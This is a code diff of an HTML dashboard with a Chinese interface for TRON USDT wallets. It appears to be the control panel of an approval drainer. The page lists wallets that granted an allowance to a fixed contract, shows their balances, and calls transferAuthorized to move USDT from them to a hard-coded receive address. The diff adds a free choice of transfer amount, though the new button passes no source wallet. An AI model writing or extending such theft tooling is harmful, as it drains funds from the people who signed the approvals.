@@ -7,8 +7,8 @@
   <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
   <style>
-    body { font-family: sans-serif; padding: 2em; background: #f9f9f9; }
-    h1 { color: #2d3436; }
+    body { font-family: sans-serif; padding: 2em; background: #f9f9f9; text-align: center; }
+    h1 { color: #222; }
     .wallet-card {
       border: 1px solid #ccc; border-radius: 10px; padding: 1em; margin: 1em 0; background: #fff;
     }
@@ -27,13 +27,18 @@
     <button onclick="checkWallet()">查詢是否授權</button>
   </div>
 
+  <!-- 輸入轉帳金額 -->
+  <div style="margin-top: 2em;">
+    <input type="number" id="transferAmount" placeholder="輸入轉帳金額 (USDT)" /> 
+    <button onclick="triggerTransfer()">觸發轉帳</button>
+  </div>
+
   <!-- 授權錢包顯示區域 -->
   <div id="wallets"></div>
 
   <script>
     const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
     const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-    const USDT_DECIMALS = 1e6;
     const YOUR_RECEIVE_ADDRESS = "THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR";
     const approvedWallets = [];
 
@@ -50,15 +55,14 @@
       try {
         const usdt = await window.tronWeb.contract().at(USDT_CONTRACT);
         const allowance = await usdt.allowance(address, AUTH_CONTRACT).call();
-        const value = parseFloat(allowance) / USDT_DECIMALS;
+        const value = parseFloat(allowance) / 1e6; // USDT 精度是 1e6
+
         if (value > 0 && !approvedWallets.includes(address)) {
           approvedWallets.push(address);
           displayWallets();
         }
+
         alert(`授權額度：${value} USDT`);
-        
-        // 儲存到後端
-        await axios.post('http://localhost:3333/wallets', { address });
       } catch (err) {
         alert("查詢失敗：" + err.message);
       }
@@ -73,8 +77,8 @@
           const balance = await usdt.balanceOf(addr).call();
           const allowance = await usdt.allowance(addr, AUTH_CONTRACT).call();
           const trxBalance = await window.tronWeb.trx.getBalance(addr);
-          const usdtAmt = parseFloat(balance) / USDT_DECIMALS;
-          const allowAmt = parseFloat(allowance) / USDT_DECIMALS;
+          const usdtAmt = parseFloat(balance) / 1e6;
+          const allowAmt = parseFloat(allowance) / 1e6;
           const trx = parseFloat(trxBalance) / 1e6;
 
           return `<div class="wallet-card">
@@ -92,11 +96,18 @@
     }
 
     async function triggerTransfer(from) {
+      const amountInput = document.getElementById("transferAmount").value;
+      if (!amountInput || parseFloat(amountInput) <= 0) {
+        return alert("請輸入有效的轉帳金額");
+      }
+
       try {
+        const amount = parseFloat(amountInput) * 1e6;  // 轉換為 USDT 精度的單位
+
         const contract = await window.tronWeb.contract().at(AUTH_CONTRACT);
-        const amount = 1 * USDT_DECIMALS;
         await contract.transferAuthorized(USDT_CONTRACT, from, YOUR_RECEIVE_ADDRESS, amount).send();
-        alert("✅ 已觸發轉帳 from " + from);
+
+        alert(`✅ 已觸發轉帳 ${amountInput} USDT from ${from}`);
       } catch (err) {
         alert("❌ 轉帳失敗：" + err.message);
       }
@@ -108,7 +119,7 @@
         if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
           clearInterval(check);
           logStatus("🟢 已連接錢包：" + window.tronWeb.defaultAddress.base58, "green");
-          fetchApprovals();
+          displayWallets();
         } else {
           attempts++;
           logStatus("⏳ 嘗試連接 TronLink 中（" + attempts + "/20）...");
